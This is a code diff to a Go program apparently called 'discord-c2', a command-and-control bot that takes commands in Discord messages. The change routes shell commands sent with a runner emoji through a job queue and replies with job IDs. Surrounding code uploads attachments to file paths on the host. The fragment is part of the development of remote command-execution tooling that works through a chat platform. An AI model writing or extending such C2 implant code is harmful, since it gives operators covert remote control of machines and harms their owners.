@@ -11,8 +11,8 @@ import (
 	"strings"
 
 	"discord-c2/internal/httpx"
+	"discord-c2/internal/jobs"
 	"discord-c2/internal/media"
-	"discord-c2/internal/shell"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -40,7 +40,7 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 			s.ChannelMessageSendReply(m.ChannelID, "Usage: 🏃‍♂️ <command>", m.Reference())
 			break
 		}
-		shell.Run(s, m.ChannelID, m.Reference(), cmdStr)
+		startShortcutJob(s, m, cmdStr)
 		flag = 1
 
 	case m.Content == "help":
@@ -157,6 +157,20 @@ func saveAttachment(s *discordgo.Session, m *discordgo.MessageCreate) int {
 	}
 	s.ChannelMessageSendReply(m.ChannelID, "Uploaded file to "+path, m.Reference())
 	return 1
+}
+
+// startShortcutJob queues a 🏃‍♂️ command and replies with the job ID.
+func startShortcutJob(s *discordgo.Session, m *discordgo.MessageCreate, cmd string) {
+	if jobManager == nil {
+		s.ChannelMessageSendReply(m.ChannelID, "Job manager is not configured.", m.Reference())
+		return
+	}
+	job, err := jobManager.Start(m.Author.ID, m.ChannelID, cmd, 0)
+	if err != nil {
+		s.ChannelMessageSendReply(m.ChannelID, "❌ "+err.Error(), m.Reference())
+		return
+	}
+	s.ChannelMessageSendReply(m.ChannelID, jobs.Ack(job), m.Reference())
 }
 
 func expandHome(path string) string {
